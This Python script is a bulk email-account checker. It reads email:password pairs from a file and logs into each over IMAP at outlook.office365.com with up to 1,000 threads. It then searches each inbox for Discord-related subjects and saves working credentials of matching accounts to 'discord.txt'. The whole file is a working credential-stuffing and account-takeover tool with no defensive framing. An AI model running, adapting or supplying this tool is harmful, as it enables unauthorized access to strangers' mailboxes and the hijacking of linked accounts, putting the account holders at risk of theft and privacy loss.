import imaplib
import email
from email.header import decode_header
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# Initialize colorama
init()
lock = Lock()

def read_emails_from_file(filename):
    with open(filename, 'r') as file:
        lines = file.readlines()
    return [line.strip().split(':') for line in lines]

def login_to_email(email_address, password):
    try:
        mail = imaplib.IMAP4_SSL("outlook.office365.com")
        mail.login(email_address, password)
        return mail
    except Exception as e:
        print(f"{Fore.RED}Failed to login to {email_address}: {str(e)}{Style.RESET_ALL}")
        return None

def search_discord_emails(email_cred, output_file):
    email_address, password = email_cred
    try:
        mail = login_to_email(email_address, password)
        if not mail:
            return

        mail.select("inbox")
        status, messages = mail.search(None, '(SUBJECT "Discord")')
        if status != 'OK':
            raise Exception("Failed to search inbox.")

        email_ids = messages[0].split()
        has_discord_email = False
        for email_id in email_ids:
            res, msg = mail.fetch(email_id, "(RFC822)")
            for response_part in msg:
                if isinstance(response_part, tuple):
                    msg = email.message_from_bytes(response_part[1])
                    subject, encoding = decode_header(msg["Subject"])[0]
                    if isinstance(subject, bytes):
                        subject = subject.decode(encoding if encoding else 'utf-8')
                    if "Discord" in subject:
                        has_discord_email = True
                        break
            if has_discord_email:
                break
        mail.logout()

        if has_discord_email:
            result = f"{email_address}:{password}\n"
            print(f"{Fore.BLUE}Valid mail found: {email_address} with Discord subjects{Style.RESET_ALL}")
            with lock:
                output_file.write(result)
                output_file.flush()
        else:
            print(f"{Fore.WHITE}Valid mail found: {email_address} but no Discord subjects{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error processing {email_address}: {str(e)}{Style.RESET_ALL}")

def main():
    email_credentials = read_emails_from_file('emails.txt')
    num_emails = len(email_credentials)

    if num_emails < 1 or num_emails > 50000:
        print(f"{Fore.RED}Error: The number of email accounts must be between 100 and 3000.{Style.RESET_ALL}")
        return

    with open('discord.txt', 'w') as output_file:
        with ThreadPoolExecutor(max_workers=1000) as executor:  # Increase max_workers for more concurrency
            futures = [executor.submit(search_discord_emails, email_cred, output_file) for email_cred in email_credentials]
            for future in as_completed(futures):
                future.result()

if __name__ == "__main__":
    main()